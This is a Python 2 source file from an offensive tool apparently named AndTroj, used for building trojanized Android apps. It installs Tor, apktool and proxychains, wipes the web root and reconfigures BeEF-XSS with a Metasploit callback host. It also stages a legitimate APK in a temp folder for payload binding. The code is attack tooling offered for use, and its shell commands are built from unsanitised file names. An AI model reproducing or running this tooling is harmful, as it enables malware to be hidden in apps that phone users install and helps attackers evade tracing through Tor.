#!/usr/bin/env python
# coding=utf-8
# https://t.me/unk9vvn
# AVI
import socket, socks, os, string, subprocess, random, shutil
from urllib2 import urlopen
from urllib import urlopen
from colorama import *



cwd = os.getcwd()
dir = '/usr/share/AndTroj'
tmp = dir + '/tmp/'


def start():
    apktool_ver = 'apktool -version'
    confproxychains = '/etc/proxychains.conf'
    apktool_response = os.popen(apktool_ver)
    check_apktool = apktool_response.read()
    if check_apktool > '2.3.4':
        os.system('service postgresql start && service tor start')
        pass
    else:
        if 'socks4  127.0.0.1 9050' in open(confproxychains).read():
            pass
        else:
            subprocess.call(
                'echo "socks4  127.0.0.1 9050" >> ' + confproxychains,
                shell=True)
        os.system(
            'apt-get install -y tor apktool aapt proxychains python-socks zipalign kali-linux-full openjdk-10-jdk openjdk-8-jdk;service tor start;'
            'proxychains wget https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.3.4.jar -O /usr/local/bin/apktool.jar;'
            'wget https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool -O /usr/local/bin/apktool;'
            'chmod +x /usr/local/bin/apktool.jar && chmod +x /usr/local/bin/apktool')
        os.system(
            'pip install colorama twilio flask env paramiko freeze SocksiPy-branch smtp2go urllib3 requests mime')
    check_cmd = os.path.exists('/usr/share/AndTroj/')
    if check_cmd == (False):
        linker = '#!/bin/bash\npython /usr/share/AndTroj/atj.py "$@"'
        linker_own = open('/usr/bin/atj', 'w')
        linker_own.write(linker)
        linker_own.close()
        os.system(
            'mkdir /usr/share/AndTroj && cd ' + cwd + '&& cp -r * /usr/share/AndTroj && chmod +x '
                                                      '/usr/share/AndTroj/atj.py /usr/share/AndTroj/requirements.txt '
                                                      '&& chmod +x /usr/bin/atj')
    else:
        pass
    check_html = os.path.exists('/var/www/html/index.html')
    if check_html == (False):
        pass
    else:
        os.system('cd /var/www/html/ && rm -r *')
        pass
    check_tmp = os.path.exists('/usr/share/AndTroj/tmp')
    if check_tmp == (False):
        os.system('mkdir {0}/tmp'.format(dir))
        os.system('chmod +x {0}/tmp'.format(dir))
    else:
        os.system('rm -r {0}/tmp'.format(dir))
        os.system('mkdir {0}/tmp'.format(dir))
        os.system('chmod +x {0}/tmp'.format(dir))
        pass


def color():
    global r, g, w, b, y, m, res
    r = Fore.RED
    g = Fore.GREEN
    w = Fore.WHITE
    b = Fore.BLUE
    y = Fore.YELLOW
    m = Fore.MAGENTA
    res = Style.RESET_ALL


def tor():
    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, "127.0.0.1", 9050, True)
    socket.socket = socks.socksocket


def cls():
    linux = 'clear'
    windows = 'cls'
    os.system([linux, windows][os.name == 'nt'])


def rnd(size=5, chars=string.ascii_lowercase):
    return ''.join(random.choice(chars) for _ in range(size))


def USER():
    USER = socket.gethostname()
    return USER


def LAN():
    LAN = ([l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2]
                          if not ip.startswith("127.")][:1], [[(s.connect(('8.8.8.8', 53)),
                          s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET,
                          socket.SOCK_DGRAM)]][0][1]]) if l][0][0])
    return LAN


def WAN():
    WAN = urlopen('http://ip.42.pl/raw').read()
    return WAN


def BEEF():
    pids = [pid for pid in os.listdir('/proc') if pid.isdigit()]
    for pid in pids:
        try:
            cmd = open(os.path.join('/proc', pid, 'cmdline'), 'rb').read()
            if cmd.find('ruby') != -1:
                print "Kill PID: %s; Command: %s" % (pid, cmd)
                subprocess.call(
                    'ps -ef | grep ruby | grep -v grep | awk \'{print $2}\' | xargs kill',
                    shell=True)
        except IOError:
            continue
    subprocess.call(
        'sed -i \'137s/.*/        enable: true/\' /usr/share/beef-xss/config.yaml;'
        'sed -i \'156s/.*/            enable: true/\' /usr/share/beef-xss/config.yaml',
        shell=True)
    subprocess.call(
        'sed -i \'18s/.*/            host: "' + LAN() + '"/\' /usr/share/beef-xss/extensions/metasploit/config.yaml;'
        'sed -i \'28s/.*/            callback_host: "' + LAN() + '"/\' /usr/share/beef-xss/extensions/metasploit/config.yaml',
        shell=True)


def rename(original):
    global payload_n
    rn = original.replace(" ", "_")
    original_rename = (' ' in original) == True
    if original_rename == (True):
        shutil.copyfile(original, "{0}".format(rn))
        subprocess.call(
            'mv ' + rn + ' ' + '/usr/share/AndTroj/tmp/orgapp.apk',
            shell=True)
        subprocess.call(
            'echo ' + rn + ' >> ' + '/usr/share/AndTroj/tmp/dir_IN_APK.txt',
            shell=True)
        subprocess.call(
            'CEALR_NAME=$(sed -nE \'s/[^"]*\///p\' /usr/share/AndTroj/tmp/dir_IN_APK.txt) && echo "$CEALR_NAME" >> /usr/share/AndTroj/tmp/name_PYLD.txt',
            shell=True)
        subprocess.call(
            'sed -nE \'s#\/##p\' /usr/share/AndTroj/tmp/name_PYLD.txt',
            shell=True)
    else:
        subprocess.call(
            'cp ' + original + ' ' + '/usr/share/AndTroj/tmp/orgapp.apk',
            shell=True)
        subprocess.call(
            'echo ' + original + ' >> ' + '/usr/share/AndTroj/tmp/dir_IN_APK.txt',
            shell=True)
        subprocess.call(
            'CEALR_NAME=$(sed -nE \'s/[^"]*\///p\' /usr/share/AndTroj/tmp/dir_IN_APK.txt) && echo "$CEALR_NAME" >> /usr/share/AndTroj/tmp/name_PYLD.txt',
            shell=True)
        subprocess.call(
            'sed -nE \'s#\/##p\' /usr/share/AndTroj/tmp/name_PYLD.txt',
            shell=True)
